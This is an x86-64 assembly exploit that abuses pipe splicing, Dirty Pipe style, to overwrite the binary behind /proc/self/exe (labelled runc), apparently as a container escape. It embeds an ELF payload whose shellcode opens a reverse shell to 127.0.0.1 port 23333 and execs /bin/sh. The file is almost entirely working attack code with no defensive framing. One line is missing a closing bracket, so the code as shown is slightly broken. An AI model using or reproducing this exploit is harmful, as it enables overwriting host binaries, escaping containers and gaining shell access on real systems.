global _start

section .text

_start:
    call main

main:
    sub rsp, 0x10008

; *******************
; prepare_pipe
; *******************
prepare_pipe:
    mov rax, SYS_PIPE
    mov rdi, rsp                                       ; p
    syscall

; *******************
; write
; init pipe with 65536
; *******************
write: 
    mov rax, SYS_WRITE
    mov rdx, PAGE_SIZE
    lea rsi, [rsp+8]                                ;buffer
    mov edi, [rsp+4]
    syscall

; *******************
; read
; init pipe with 65536
; *******************
read: 
    mov rax, SYS_READ
    mov rdx, PAGE_SIZE
    lea rsi,  [rsp+8]                         ;buffer
    mov edi,  [rsp]                          ; p[0]
    syscall

; *******************
; open
; get runc's fd
; *******************
open:
    mov rax, SYS_OPEN
    mov rdx, 0
    mov rsi, O_RDONLY                          ;flags
    ;mov rdi, runc                                       ;filename
    lea rdi, [rel runc
    syscall

; *******************
; splice
; *******************
splice: 
    mov r9, 0                                                     ; flags
    mov r8, 1                                                     ; len
    mov rcx, NULL                                           ; off_out
    mov edx, [rsp+4]                                          ; p[1]
    mov rsi,   0                                                  ; offset
    mov rdi,  rax                          ; fd
    mov rax, SYS_SPLICE
    syscall

; *******************
; write_payload
; 
; *******************
write_payload: 
    mov rdx, MAX_LENGTH                                ; length
    mov rsi,   payload                                             ; payload
    mov edi, [rsp+4]                                       ; p[1]
    mov rax, SYS_WRITE
    syscall

; *******************
; exit
; *******************
exit:
    mov       rax, SYS_EXIT
    xor       rdi, rdi                      ; exit code 0
    syscall                               ; invoke operating system to exit

section .data
    ; ********syscall*******
    SYS_READ:                   equ 0
    SYS_WRITE:                  equ 1
    SYS_OPEN:                   equ 2
    SYS_PIPE:                   equ 22
    SYS_EXIT:                       equ 60
    SYS_SPLICE:                 equ 275
    ; ********flag*******
    LF                                  equ    10            ; line feed
    NULL                            equ    0             ; end of string
    STDOUT:                       equ 1
    O_RDONLY           equ    000000q        ; read only
    BUFF_SIZE          equ 255
    PAGE_SIZE           equ 65536
    MAX_LENGTH equ 151
    ; ********string*******
    runc db '/proc/self/exe',NULL ; runc fd
    payload db 69, 76, 70, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 2, 0, 3, 0, 1, 0, 0, 0, 84, 128, 4, 8, 52, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 52, 0, 32, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 128, 4, 8, 0, 128, 4, 8, 152, 0, 0, 0, 220, 0, 0, 0, 7, 0, 0, 0, 0, 16, 0, 0, 49, 219, 247, 227, 83, 67, 83, 106, 2, 137, 225, 176, 102, 205, 128, 147, 89, 176, 63, 205, 128, 73, 121, 249, 104, 127, 0, 0, 1, 104, 2, 0, 91, 37, 137, 225, 176, 102, 80, 81, 83, 179, 3, 137, 225, 205, 128, 82, 104, 110, 47, 115, 104, 104, 47, 47, 98, 105, 137, 227, 82, 83, 137, 225, 176, 11, 205, 128

;section    .bss
